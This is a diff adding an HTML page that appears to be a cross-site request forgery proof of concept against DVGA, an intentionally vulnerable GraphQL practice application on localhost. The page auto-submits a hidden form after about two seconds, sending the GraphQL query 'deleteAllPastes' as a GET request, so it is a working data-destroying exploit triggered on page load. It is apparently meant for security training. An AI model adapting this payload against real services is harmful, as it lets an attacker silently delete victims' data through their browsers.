@@ -1,0 +1,26 @@
+<!-- Ensure your DVGA is set to port 5013 on localhost! -->
+<html>
+  <body>
+    <h1>This form is going to submit itself in 2 seconds...</h1>
+     <form id="auto_submit_form" method="GET" action="http://localhost:5013/graphql">
+       <input type="hidden" name="query" value="query { deleteAllPastes }"/>
+       <input type="submit" value="Submit">
+     </form>
+  </body>
+
+<script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function csrf() {
+    for (let i = 0; i < 2; i++) {
+        await sleep(i * 1000);
+    }
+    document.forms['auto_submit_form'].submit();
+}
+
+csrf();
+
+</script>
+<html>
